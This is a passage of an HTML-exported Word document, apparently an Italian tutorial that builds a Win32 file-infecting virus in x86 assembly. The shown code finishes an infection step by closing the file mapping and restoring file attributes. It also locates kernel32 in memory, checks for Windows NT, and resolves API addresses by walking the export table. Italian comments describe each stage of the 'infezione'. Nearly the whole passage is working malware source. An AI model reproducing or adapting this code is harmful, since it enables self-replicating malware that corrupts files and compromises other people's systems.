normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+MapHandle]<span style="mso-spacerun: yes">       </span>; Chiusura mapping<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_CloseHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CloseFile:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+FileHandle]<span style="mso-spacerun: yes">      </span>; Chiusura file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_CloseHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CantOpen:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+WFD_dwFileAttributes]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>lea<span style="mso-spacerun: yes">    
</span>eax,[ebp+WFD_szFileName]<span style="mso-spacerun: yes">        </span>;
Setta i vecchi attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">  </span>[ebp+_SetFileAttributesA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 15) CHIUDE
TUTTO<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; chiudiamo tutto
quello che abbiamo aperto durante l’infezione: <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; l’indirizzo di mappatura.
la mappatura, il file, e ripristiniamo i vecchi attributi.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------</span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>GetK32<span style="mso-spacerun: yes">         
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_@1:<span style="mso-spacerun: yes">   
</span>cmp<span style="mso-spacerun: yes">     </span>word ptr
[esi],&quot;ZM&quot;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>jz<span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">  </span>WeGotK32<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>_@2:<span
style="mso-spacerun: yes">    </span>sub<span style="mso-spacerun: yes">    
</span>esi,10000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>loop<span style="mso-spacerun: yes">    </span>_@1<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WeFailed:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>ecx,cs<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>cl,cl<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>jecxz<span style="mso-spacerun: yes">   </span>WeAreInWNT<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>esi,kernel_<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>jmp<span style="mso-spacerun: yes">     </span>WeGotK32<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WeAreInWNT:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span lang=DE style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF;mso-ansi-language:DE'>mov<span style="mso-spacerun:
yes">     </span>esi,kernel_wNT<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>WeGotK32:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span>xchg<span
style="mso-spacerun: yes">    </span>eax,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>GetK32<span style="mso-spacerun: yes">         
</span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>GetAPIs<span style="mso-spacerun: yes">        
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@@1:<span style="mso-spacerun: yes">   
</span>push<span style="mso-spacerun: yes">    </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>edi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>GetAPI<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pop<span style="mso-spacerun: yes">     </span>edi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pop<span style="mso-spacerun:
yes">     </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>stosd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xchg<span style="mso-spacerun:
yes">    </span>edi,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>xor<span style="mso-spacerun: yes">     </span>al,al<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@@2:<span style="mso-spacerun: yes">    </span>scasb<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">   </span></span></b><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>jnz<span
style="mso-spacerun: yes">     </span>@@2<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xchg<span style="mso-spacerun:
yes">    </span>edi,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>@@3:<span
style="mso-spacerun: yes">    </span>cmp<span style="mso-spacerun: yes">    
</span>byte ptr [esi],0BBh<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>jnz<span style="mso-spacerun: yes">     </span>@@1<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>GetAPIs<span style="mso-spacerun: yes">        
</span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>GetAPI<span
style="mso-spacerun: yes">          </span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edx,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edi,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xor<span style="mso-spacerun:
yes">     </span>al,al<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>@_1:<span
style="mso-spacerun: yes">    </span>scasb<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jnz<span style="mso-spacerun:
yes">     </span>@_1<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>sub<span style="mso-spacerun:
yes">     </span>edi,esi<span style="mso-spacerun:
yes">                         </span>; EDI = misura nome API <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ecx,edi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xor<span style="mso-spacerun:
yes">     </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>esi,3Ch<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>esi,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lodsw<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>esi,[eax+78h]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>esi,1Ch<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>esi,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lea<span style="mso-spacerun:
yes">     </span>edi,[ebp+AddressTableVA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lodsd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>stosd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lodsd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">   
</span>eax<span style="mso-spacerun: yes">             </span><span
style="mso-spacerun: yes">                </span>; mov [NameTableVA],eax<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>stosd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>lodsd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>stosd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>pop<span style="mso-spacerun: yes">     </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
